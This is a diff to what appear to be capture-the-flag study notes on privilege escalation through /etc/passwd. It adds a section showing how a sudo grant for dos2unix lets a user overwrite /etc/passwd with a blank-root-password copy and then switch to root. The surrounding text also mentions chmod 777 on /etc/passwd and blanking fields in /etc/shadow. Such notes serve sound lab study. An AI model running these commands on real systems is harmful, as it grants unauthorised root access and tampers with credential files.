@@ -45,6 +45,18 @@ chmod 777 /etc/passwd
 
 Owning the file also lets you `chmod` it. This is the [[anonymous-pingu]] route ([[sudo-abuse]]).
 
+## Overwriting via `sudo dos2unix`
+
+If `sudo -l` grants `dos2unix` as root, its `-f -n` (force + output-to-file) can overwrite `/etc/passwd` with a blank-root copy:
+
+```sh
+sed 's/root:x:/root::/' /etc/passwd > /tmp/passwd.new
+sudo -u root dos2unix -f -n /tmp/passwd.new /etc/passwd
+su -
+```
+
+This is the [[bruteshock]] route — `dos2unix` is a GTFOBins "file overwrite" primitive ([[gtfobins]]).
+
 ## Notes
 
 - Modern systems store hashes in `/etc/shadow`, but an empty password field still bypasses auth on many setups. The same empty-field trick works in `/etc/shadow` (blank the second field).
@@ -52,4 +64,4 @@ Owning the file also lets you `chmod` it. This is the [[anonymous-pingu]] route 
 
 ## Seen in
 
-[[adopting]], [[anonymous-pingu]]
+[[adopting]], [[anonymous-pingu]], [[bruteshock]]
